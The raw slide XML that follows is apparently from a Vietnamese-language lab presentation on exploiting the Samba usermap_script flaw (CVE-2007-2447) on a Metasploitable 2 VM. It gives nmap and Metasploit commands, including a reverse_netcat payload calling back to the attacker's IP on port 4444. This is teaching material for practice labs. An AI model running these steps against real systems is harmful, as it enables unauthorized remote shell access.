              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900" algn="r">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pP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hiện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phân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tích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pháp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> y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máy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metasploiable</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các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> log</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ip </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>máy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tấn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công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>: 192.168.1.16</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ip </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>máy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> victim: 192.168.1.51</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:buAutoNum type="arabicPeriod"/>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228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268222" y="184100"/>
            <a:ext cx="11560456" cy="1542287"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0" err="1"/>
              <a:t>Tấn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0" err="1"/>
              <a:t>Công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0" err="1"/>
              <a:t>Lỗ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0" err="1"/>
              <a:t>Hổng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0"/>
              <a:t> Samba </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0" err="1"/>
              <a:t>usermap_script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0"/>
              <a:t> (CVE-2007-2447)</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195070" y="2154596"/>
            <a:ext cx="11787227" cy="4519304"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="1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F1BBAED-FE27-4588-B312-0B2726A984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703" y="2216485"/>
            <a:ext cx="5740368" cy="3416219"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DF8CC1B6-C500-43E5-8FB7-95310F5BD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216485"/>
            <a:ext cx="5761968" cy="3657621"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="259883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187755" y="179358"/>
            <a:ext cx="11801857" cy="310760"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Thực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hiện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400"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268222" y="728132"/>
            <a:ext cx="11721389" cy="5950510"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="vi-VN" sz="1400" b="1" dirty="0"/>
              <a:t>Quét Dịch vụ (Sử dụng Nmap):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1400" dirty="0"/>
              <a:t> Thực hiện quét cơ bản để tìm các dịch vụ đang mở, đặc biệt là cổng </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1400" b="1" dirty="0"/>
              <a:t>139</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1400" dirty="0"/>
              <a:t> và </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1400" b="1" dirty="0"/>
              <a:t>445</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1400" dirty="0"/>
              <a:t> (Samba/SMB).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>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nmap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sv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> -o 192.168.1.51</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ta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kết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quả</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="14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0C4E1B77-FDBE-4990-937E-EE5BDC494D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9338" y="1844433"/>
            <a:ext cx="7887801" cy="4734586"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1307474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363536" y="172043"/>
            <a:ext cx="11582186" cy="661889"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="vi-VN" sz="1800" b="1" dirty="0"/>
              <a:t>Xác nhận Lỗ hổng: Trong kết quả Nmap, bạn sẽ thấy dịch vụ Samba đang chạy, thường là phiên bản 3.0.20 hoặc tương tự, phiên bản này đã bị ảnh hưởng bởi lỗ hổng usermap_script.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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465734" y="1020739"/>
            <a:ext cx="11479988" cy="5665218"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Khởi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động</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Metasploit Framework:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>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msfconsole</a:t>
            </a:r>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endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{46261DFD-1CD9-4078-8826-EE563B3CC8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8576" y="1020738"/>
            <a:ext cx="7337146" cy="5003263"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1034447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187755" y="106206"/>
            <a:ext cx="11670184" cy="376597"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Thiết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lập</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Module </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Khai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thác</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> (Exploit Module)</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187754" y="1020740"/>
            <a:ext cx="11670183" cy="5636092"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="vi-VN" sz="1400" dirty="0"/>
              <a:t>Tìm kiếm và sử dụng module khai thác đã được xây dựng sẵn cho lỗ hổng này.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>search samba </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>usermap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="1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348AD36-EB8A-454D-857A-79BCF7C46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3353" y="1546040"/>
            <a:ext cx="6724773" cy="3947676"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="496254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3896D9A-3E22-4407-BC78-6CF1F6B8CF4C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="165938" y="195587"/>
            <a:ext cx="1186012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Chọn</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Khai</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thác</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Bạn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sẽ</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chọn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module $exploit/multi/samba/</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usermap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\_script$</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Subtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{33A34035-1BF1-428C-BEEA-9485299D7154}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="312738" y="808038"/>
            <a:ext cx="11552237" cy="5564187"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>	use exploit/multi/samba/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>usermap_script</a:t>
            </a:r>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r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>+) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>Xem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>Tùy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1"/>
              <a:t>chọn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t> (Options):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>	show options</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7E687266-8E66-49B3-BC00-F3B537F7D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9209" y="1234117"/>
            <a:ext cx="7906853" cy="790685"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7CB6ACC1-DEAB-456F-8B13-7057C36CD6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9392" y="2339334"/>
            <a:ext cx="5986485" cy="4172616"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="281859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363535" y="157413"/>
            <a:ext cx="11530979" cy="340021"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Cấu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hình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Mục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tiêu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Payload</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363535" y="750077"/>
            <a:ext cx="11530978" cy="5804342"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="vi-VN" sz="1400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Đây là bước quan trọng nhất, nơi bạn chỉ định mục tiêu và cách bạn muốn chiếm quyền kiểm soát.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Đặt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Địa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>chỉ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Mục</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>tiêu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> ($RHOSTS$): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Đặt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>của</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> 2.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>set RHOSTS 192.168.1.51</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="vi-VN" sz="1400" dirty="0"/>
              <a:t>Chọn Payload (Shell để chiếm quyền):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="vi-VN" sz="1400" dirty="0"/>
              <a:t>$Payload$ là mã độc sẽ được thực thi trên máy mục tiêu. Trong trường hợp này, bạn muốn một $shell$ để thực thi lệnh.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>	set PAYLOAD </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>cmd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>unix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>reverse_netcat</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="vi-VN" sz="1400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Đặt Địa chỉ IP và Cổng của Kali ($LHOST$/$LPORT$):Đây là nơi Metasploit sẽ lắng nghe kết nối ngược (reverse connection) từ máy Metasploitable 2.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="vi-VN" sz="1400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>$LHOST$: Địa chỉ IP của máy Kali Linux của bạn.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="vi-VN" sz="1400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>$LPORT$: Cổng bạn muốn lắng nghe (ví dụ: 4444).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>set LHOST 192.168.1.16</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>set LPORT 4444</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{67BD61C9-FDAE-490C-9638-A33CF467F4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8757" y="1150758"/>
            <a:ext cx="5401429" cy="752580"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
